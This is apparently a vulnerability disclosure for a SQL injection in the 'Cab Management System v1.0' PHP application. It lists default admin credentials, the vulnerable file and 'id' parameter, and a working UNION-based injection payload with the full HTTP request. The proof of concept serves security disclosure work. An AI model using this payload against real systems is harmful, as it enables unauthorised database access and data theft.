# Cab Management System v1.0 by sourcecodester has SQL injection 2

BUG_Author: Du Kai

Login account: admin/admin123

vendors: https://www.sourcecodester.com/php/15180/cab-management-system-phpoop-free-source-code.html

The program is built using the xmapp-php8.1 version

Vulnerability File: /cms/admin/bookings/view_booking.php

Vulnerability location: /cms/admin/bookings/view_booking.php?id=, id

dbname=cms_db

[+] Payload: /cms/admin/bookings/view_booking.php?id=1%27%20union%20select%201,2,3,4,database(),6,7,8,9,10--+ // Leak place ---> id

```sql
GET /cms/admin/bookings/view_booking.php?id=1%27%20union%20select%201,2,3,4,database(),6,7,8,9,10--+ HTTP/1.1
Host: 192.168.1.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: PHPSESSID=eip4v1c8uqq26lj07th6057jko
Connection: close


```

<img width="1102" height="913" alt="image" src="https://github.com/user-attachments/assets/396493d2-311d-4c11-a0f1-ed9ab360617d" />
